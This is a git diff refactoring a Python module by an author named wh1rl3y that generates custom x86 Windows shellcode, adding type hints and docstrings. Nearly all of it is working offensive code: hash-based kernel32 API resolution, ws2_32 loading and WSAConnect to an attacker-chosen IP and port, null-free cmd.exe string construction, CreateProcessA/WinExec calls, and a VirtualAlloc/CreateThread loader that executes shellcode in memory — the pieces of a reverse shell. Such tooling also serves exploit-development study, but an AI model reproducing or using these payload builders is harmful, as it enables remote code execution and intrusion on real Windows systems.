@@ -1,24 +1,59 @@
+
 """
-Generate custom shellcode payloads.
+Generate custom shellcode payloads for Windows targets.
+
+This module provides building blocks to create custom shellcode payloads
+for Windows systems. It includes functions for finding and resolving API functions,
+network operations, process creation, and command execution.
+
+Usage categories:
+- API Function Resolution: Functions to locate and resolve Windows API functions
+- Network Operations: Socket creation and connection functions
+- Process Operations: Functions to create and execute processes
+- Command Execution: Functions to execute commands via cmd.exe or WinExec
+- Utility Functions: Helper functions for shellcode generation and manipulation
 
 Author: wh1rl3y
 Date: 2025-07-07
 """
-import socket, sys
-import ctypes, struct
 
+import ctypes
+import socket
+import struct
+import sys
+from typing import Dict, List, Optional, Tuple, Union
+
+# Constants
 SUCCESS = 'success'
 FAIL = 'fail'
 
+# ===============================
+# Utility and Helper Functions
+# ===============================
 
-def ror_str(byte, count):
+def print_info(text: str, status: str = SUCCESS, level: int = 0, verbose: bool = False) -> None:
+    """Print formatted information based on status and indentation level."""
+    if not verbose:
+        return
+    if level == 0:
+        if status == FAIL:
+            print(f'[-] {text}')
+        else:
+            print(f'[+] {text}')
+    else:
+        padd = ' ' * level * 5
+        print(f'{padd}| {text}')
+
+def ror_str(byte: int, count: int) -> int:
+    """Perform a right rotate operation on a 32-bit value."""
     binb = bin(byte)[2:].zfill(32)
     while count > 0:
         binb = binb[-1] + binb[0:-1]
         count -= 1
     return int(binb, 2)
 
-def calculate_function_hash(function_name, verbose=False):
+def calculate_function_hash(function_name: str, verbose: bool = False) -> str:
+    """Calculate the hash value for a Windows API function name."""
     print_info(f'Generate hash for {function_name}', SUCCESS, 1, verbose)
     edx = 0x00
     ror_count = 0
@@ -30,35 +65,31 @@ def calculate_function_hash(function_name, verbose=False):
     print_info(f'{hex(edx)} = {function_name}', SUCCESS, 2, verbose)
     return hex(edx)
 
-# Helper functions
-def print_info(text, status=SUCCESS, level=0, verbose=False):
-    if not verbose:
-        return
-    if level == 0:
-        if status == FAIL:
-            print(f'[-] {text}')
-        else:
-            print(f'[+] {text}')
-    else:
-        padd = ' '*level*5
-        print(f'{padd}| {text}')
-
-def print_shellcode(shellcode, language='python', var_name='buf', length=16):
+def print_shellcode(shellcode: bytes, language: str = 'python', var_name: str = 'buf', length: int = 16) -> None:
+    """Format and print shellcode in a readable format for the specified language."""
     if language == 'python':
         print(f'{var_name} = b""')
-        for index in range(0,len(shellcode)):
-            if index%length == 0:
-                print (f'{var_name} += b"',end='')
-            print(f'\\x{shellcode[index]:02x}', end='')
-            if index%length == 15 and index != len(shellcode):
-                print (f'"')
-        print(f'"')
+        for index, byte in enumerate(shellcode):
+            if index % length == 0:
+                print(f'{var_name} += b"', end='')
+            print(f'\\x{byte:02x}', end='')
+            if (index + 1) % length == 0 or index == len(shellcode) - 1:
+                print('"')
+    elif language == 'c++':
+        print(f'unsigned char {var_name}[] =')
+        print('    "', end='')
+        for index, byte in enumerate(shellcode):
+            print(f'\\x{byte:02x}', end='')
+            if (index + 1) % length == 0 and index != len(shellcode) - 1:
+                print('"\n    "', end='')
+        print('";')
 
-def print_asm(asm_string):
+def print_asm(asm_string: str) -> None:
+    """Print assembly code in a readable format."""
     print(make_print_friendly_asm(asm_string))
 
-
-def make_print_friendly_asm(asm_string):
+def make_print_friendly_asm(asm_string: str) -> str:
+    """Format assembly code for better readability."""
     data = ''
     for cmd in asm_string.split(';'):
         if ':' in cmd:
@@ -69,33 +100,92 @@ def make_print_friendly_asm(asm_string):
             data += f'{cmd:<60};\n'
     return data
 
-def get_ip_hex(ip_addr):
+def get_ip_hex(ip_addr: str) -> str | bool:
+    """Convert an IP address to its hexadecimal representation."""
     try:
-        return f"0x{struct.unpack('<I', socket.inet_aton(ip_addr))[0]:08x}";
-    except:
-        print_info(f'Invalid IP: {ip_addr}', FAIL, 0, True)
-        sys.exit()
+        return f"0x{struct.unpack('<I', socket.inet_aton(ip_addr))[0]:08x}"
+    except socket.error:
+        return False
 
+def get_port_hex(port_num: int) -> str:
+    """Convert a port number to its hexadecimal representation."""
+    return "0x" + "".join("{:02x}".format(c) for c in struct.pack("<h", port_num))
 
-def get_port_hex(port_num):
-    return "0x"+"".join("{:02x}".format(c) for c in struct.pack("<h",port_num))
+def add_negated_value(cmd_hex: str, verbose: bool) -> str:
+    """Generate assembly code for a negated hex value."""
+    packed_value = struct.pack('<I', int(cmd_hex, 16))
+    print_info(f'{cmd_hex} <E: {''.join(f'\\x{byte:02x}' for byte in packed_value)}', SUCCESS, 2, verbose)
+    return (
+        f"  mov   eax, 0x{packed_value.hex()};"  #   Move packed value into EAX
+        f"  neg   eax                       ;"  #   Negate EAX
+        f"  dec   al                        ;"
+        f"  push  eax                       ;"  #   Push part of the string
+    )
 
+def execute_shellcode(shellcode: bytes) -> None:
+    """Allocate memory, copy shellcode, and execute it."""
+    ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
+                                             ctypes.c_int(len(shellcode)),
+                                             ctypes.c_int(0x3000),
+                                             ctypes.c_int(0x40))
 
-# Buidling Block functions
-def change_command_to_memory_hex (cmd, bad_char_list, verbose): 
-    #Adding some spacers to clean the end of command for easier loading into memory
+    buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
+
+    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
+                                        buf,
+                                        ctypes.c_int(len(shellcode)))
+
+    print("Shellcode located at address %s" % hex(ptr))
+    input("...ENTER TO EXECUTE SHELLCODE...")
+
+    ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
+                                            ctypes.c_int(0),
+                                            ctypes.c_int(ptr),
+                                            ctypes.c_int(0),
+                                            ctypes.c_int(0),
+                                            ctypes.pointer(ctypes.c_int(0)))
+
+    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))
+
+def generate_python_script(asm_code: str, path: str) -> None:
+    """Generate a Python script that assembles the provided code."""
+    script = (
+    'from keystone import * \n'
+    'import struct\n'
+    'try:\n'
+    f'    asm_code="{asm_code}"\n'
+    '    ks = Ks(KS_ARCH_X86, KS_MODE_32)\n'
+    '    encoding, count = ks.asm(asm_code)\n'
+    '    sh = b""\n'
+    '    for e in encoding:\n'
+    '        sh += struct.pack("B", e)\n'
+    '    shellcode = bytearray(sh)\n'
+    '    for index in range(0,len(shellcode)):\n'
+    '        print(f"\\\\x{shellcode[index]:02x}", end="")\n'
+    'except Exception as e:\n'
+    '    print("Failed to create shellcode:", e)\n')
+
+    with open(path, "w") as file:
+        file.write(script)
+
+# ===============================
+# Command String Processing
+# ===============================
+
+def change_command_to_memory_hex(cmd: str, bad_char_list: List[int], verbose: bool) -> List[Dict[str, str]]:
+    """Convert a command string to memory-friendly hex chunks."""
+    # Adding spacers to clean the end of command for easier loading into memory
     if len(cmd) % 4 == 0:
-        cmd += '\0'*3
+        cmd += '\0' * 3
     else:
-        cmd += '\0'*(3-(len(cmd)%4))
-    
-    
+        cmd += '\0' * (3 - (len(cmd) % 4))
+
     # Any text string that we want to execute has to be split into 4 byte chunks
-    cmd_chunks =  [cmd[i:i+4] for i in range(0, len(cmd), 4)]
-    
-    print_info(f'Command Chunks:', SUCCESS, 1, verbose) 
+    cmd_chunks = [cmd[i:i+4] for i in range(0, len(cmd), 4)]
+
+    print_info(f'Command Chunks:', SUCCESS, 1, verbose)
     print_info(f'{cmd_chunks}', SUCCESS, 2, verbose)
-    print_info(f'Command Chunks Hex:', SUCCESS, 1, verbose) 
+    print_info(f'Command Chunks Hex:', SUCCESS, 1, verbose)
     hex_chunks = []
     for chunk in cmd_chunks:
         negated = ''
@@ -107,22 +197,47 @@ def change_command_to_memory_hex (cmd, bad_char_list, verbose):
             hex_chunks.append({'hex': hex_value, 'func': 'neg'})
         else:
             hex_value = chunk.encode('utf-8').hex()
-            print_info (f'{chunk} = {hex_value} {negated}', SUCCESS, 2, verbose)
+            print_info(f'{chunk} = {hex_value} {negated}', SUCCESS, 2, verbose)
             hex_chunks.append({'hex': hex_value})
     print_info(f'Command hex Chunks:', SUCCESS, 1, verbose)
     print_info(hex_chunks, SUCCESS, 2, verbose)
     return hex_chunks
 
-
-def create_asm_start(force_break=False):
-    asm = f"start:"
+def create_command_string(cmd_chunks: List[Dict[str, str]], count: int, verbose: bool = False, force_break: bool = False) -> str:
+    """Generate assembly code to create a command string from hex chunks."""
+    print_info('Command String Hex:', SUCCESS, 1, verbose)
+    asm = f"create_command_string_{count}:"
     if force_break:
-        asm += f"  int3                        ;"  #   Break on start for debugging !!!! REMOVE BEFORE USE
-    asm += f"  mov     ebp, esp                ;"
-    asm += f"  add     esp, 0xfffff9f0         ;"  #   Extra space to not clobber the stack, we add (0x00 - 0x210) which gets rid of the NULL bytes
+        asm += f"  int3                        ;"  #   Break on start for debugging
+    for index in range(len(cmd_chunks), 0, -1):
+        chunk = cmd_chunks[index-1]
+        func = chunk.get('func', 'none')
+        if func == 'none':
+            packed_value = struct.pack('<I', int(chunk.get('hex'), 16))
+            print_info(f'{chunk.get('hex')} <E: {"".join(f"\\x{byte:02x}" for byte in packed_value)}', SUCCESS, 2, verbose)
+            asm += f"  push  0x{packed_value.hex()}                ;"  #   Push the remainder of the string
+        elif func == 'neg':
+            asm += add_negated_value(chunk.get('hex'), verbose)
+
+    asm += f"  push  esp                       ;"  #   Push pointer to the string
+    asm += f"  pop   ebx                       ;"  #   Store pointer to the string in EBX
     return asm
 
-def find_kernel32():
+# ===============================
+# Windows API Function Resolution
+# ===============================
+
+def create_asm_start(force_break: bool = False) -> str:
+    """Generate the starting assembly code for shellcode."""
+    asm = f"start:"
+    if force_break:
+        asm += f"  int3                        ;"  #   Break on start for debugging
+    asm += f"  mov     ebp, esp                ;"
+    asm += f"  add     esp, 0xfffff9f0         ;"  #   Extra space to not clobber the stack
+    return asm
+
+def find_kernel32() -> str:
+    """Generate assembly code to find the kernel32.dll base address."""
     return (
         f"find_kernel32:"
         f"  xor     ecx,ecx                 ;"  #   Zero ECX
@@ -199,13 +314,14 @@ def find_kernel32():
         f"  ret                             ;"  #
     )
 
-def resolve_kernel32_functions(exec_function='CreateProcessA', verbose=False, force_break=False):
+def resolve_kernel32_functions(exec_function: str = 'CreateProcessA', verbose: bool = False, force_break: bool = False) -> str:
+    """Generate assembly code to resolve required kernel32.dll functions."""
     print_info('Resolving Functions in Kernel32:', SUCCESS, 0, True)
     function_list = ["TerminateProcess", 'LoadLibraryA', exec_function]
     resolve_symbols_string = f"resolve_kernel32_funcitons:"
     counter = 0x10
     if force_break:
-        resolve_symbols_string += f"  int3                        ;"  #   Break on start for debugging !!!! REMOVE BEFORE USE
+        resolve_symbols_string += f"  int3                        ;"  #   Break on start for debugging
     for function_name in function_list:
         function_hash = calculate_function_hash(function_name, verbose)
         resolve_symbols_string += (f"  push {function_hash} ;"
@@ -215,8 +331,12 @@ def resolve_kernel32_functions(exec_function='CreateProcessA', verbose=False, fo
 
     return resolve_symbols_string
 
-    
-def load_ws2_32_and_resolve_symbols():
+# ===============================
+# Network Operations
+# ===============================
+
+def load_ws2_32_and_resolve_symbols() -> str:
+    """Generate assembly code to load ws2_32.dll and resolve required functions."""
     return (
         f"load_ws2_32:"  #
         f"  xor   eax, eax                  ;"  #   NULL EAX
@@ -240,7 +360,8 @@ def load_ws2_32_and_resolve_symbols():
         f"  mov   [ebp+0x24], eax           ;"  #   Save WSAConnect address for later usage
     )
 
-def create_socket_and_connect(ip_hex, port_hex):
+def create_socket_and_connect(ip_hex: str, port_hex: str) -> str:
+    """Generate assembly code to create a socket and connect to a target IP and port."""
     return (
         f"call_wsastartup:"  #
         f"  mov   eax, esp                  ;"  #   Move ESP to EAX
@@ -270,8 +391,8 @@ def create_socket_and_connect(ip_hex, port_hex):
         f"  xor   eax, eax                  ;"  #   NULL EAX
         f"  push  eax                       ;"  #   Push sin_zero[]
         f"  push  eax                       ;"  #   Push sin_zero[]
-        f"  push  {ip_hex}                  ;  "#   Push sin_addr (192.168.119.120)
-        f"  mov   ax, {port_hex}            ;"  #   Move the sin_port (443) to AX
+        f"  push  {ip_hex}                  ;  "#   Push sin_addr
+        f"  mov   ax, {port_hex}            ;"  #   Move the sin_port to AX
         f"  shl   eax, 0x10                 ;"  #   Left shift EAX by 0x10 bytes
         f"  add   ax, 0x02                  ;"  #   Add 0x02 (AF_INET) to AX
         f"  push  eax                       ;"  #   Push sin_port & sin_family
@@ -289,8 +410,12 @@ def create_socket_and_connect(ip_hex, port_hex):
         f"  call dword ptr [ebp+0x24]       ;"  #   Call WSAConnect
     )
 
+# ===============================
+# Process Creation Functions
+# ===============================
 
-def create_startup_info_a(count):    
+def create_startup_info_a(count: int) -> str:
+    """Generate assembly code to create a STARTUPINFOA structure."""
     return (
         f"create_startupinfoa_{count}:"  #
         f"  push  esi                       ;"  #   Push hStdError
@@ -321,36 +446,8 @@ def create_startup_info_a(count):
         f"  pop   edi                       ;"  #   Store pointer to STARTUPINFOA in EDI
     )
 
-def add_negated_value(cmd_hex, verbose):
-    packed_value = struct.pack('<I', int(cmd_hex, 16))
-    print_info(f'{cmd_hex} <E: {''.join(f'\\x{byte:02x}' for byte in packed_value)}', SUCCESS, 2, verbose)
-    return (
-        f"  mov   eax, 0x{packed_value.hex()};"  #   Move 0xff9a879b into EAX
-        f"  neg   eax                       ;"  #   Negate EAX, EAX = 00657865
-        f"  dec   al                        ;"
-        f"  push  eax                       ;"  #   Push part of the "cmd.exe" string
-    )
-
-def create_command_string(cmd_chunks, count, verbose=False, force_break=False):
-    print_info('Command String Hex:', SUCCESS, 1, verbose)
-    asm = f"create_command_string_{count}:"
-    if force_break:
-        asm += f"  int3                        ;"  #   Break on start for debugging !!!! REMOVE BEFORE USE
-    for index in range(len(cmd_chunks), 0, -1):
-        chunk = cmd_chunks[index-1]
-        func = chunk.get('func', 'none')
-        if func == 'none':
-            packed_value = struct.pack('<I', int(chunk.get('hex'), 16))
-            print_info(f'{chunk.get('hex')} <E: {"".join(f"\\x{byte:02x}" for byte in packed_value)}', SUCCESS, 2, verbose)
-            asm += f"  push  0x{packed_value.hex()}                ;"  #   Push the remainder of the "cmd.exe" string
-        elif func == 'neg':
-            asm += add_negated_value(chunk.get('hex'), verbose)
-    
-    asm += f"  push  esp                       ;"  #   Push pointer to the "cmd.exe" string
-    asm += f"  pop   ebx                       ;"  #   Store pointer to the "cmd.exe" string in EBX
-    return asm
-
-def create_process_a(count):
+def create_process_a(count: int) -> str:
+    """Generate assembly code to call CreateProcessA."""
     return (
         f"call_createprocessa_{count}:"  #
         f"  mov   eax, esp                  ;"  #   Move ESP to EAX
@@ -374,7 +471,8 @@ def create_process_a(count):
         f"  call dword ptr [ebp+0x18]       ;"  #   Call CreateProcessA
     )
 
-def exec_win(count):
+def exec_win(count: int) -> str:
+    """Generate assembly code to call WinExec."""
     return (
         f"exec_win_{count}:"                    #
         f"  xor   eax, eax                  ;"  # NULL ECX
@@ -382,49 +480,3 @@ def exec_win(count):
         f"  push  ebx                       ;"  # Push lpCmdLine
         f"  call dword ptr [ebp+0x18]       ;"  # Call WinExec
     )
-
-def execute_shellcode(shellcode):
-    ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
-                                              ctypes.c_int(len(shellcode)),
-                                              ctypes.c_int(0x3000),
-                                              ctypes.c_int(0x40))
-
-    buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
-
-    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
-                                         buf,
-                                         ctypes.c_int(len(shellcode)))
-
-
-    print("Shellcode located at address %s" % hex(ptr))
-    input("...ENTER TO EXECUTE SHELLCODE...")
-
-    ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
-                                             ctypes.c_int(0),
-                                             ctypes.c_int(ptr),
-                                             ctypes.c_int(0),
-                                             ctypes.c_int(0),
-                                             ctypes.pointer(ctypes.c_int(0)))
-
-    
-    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))
-
-def generate_python_script(asm_code, path):
-    script = (
-    'from keystone import * \n'
-    'import struct\n'
-    'try:\n'
-    f'    asm_code="{asm_code}"\n'
-    '    ks = Ks(KS_ARCH_X86, KS_MODE_32)\n'
-    '    encoding, count = ks.asm(asm_code)\n'
-    '    sh = b""\n'
-    '    for e in encoding:\n'
-    '        sh += struct.pack("B", e)\n'
-    '    shellcode = bytearray(sh)\n'
-    '    for index in range(0,len(shellcode)):\n'
-    '        print(f"\\\\x{shellcode[index]:02x}", end="")\n'
-    'except Exception as e:\n'
-    '    print("Failed to create shellcode:", e)\n')
-
-    with open(path, "w") as file:
-        file.write(script)
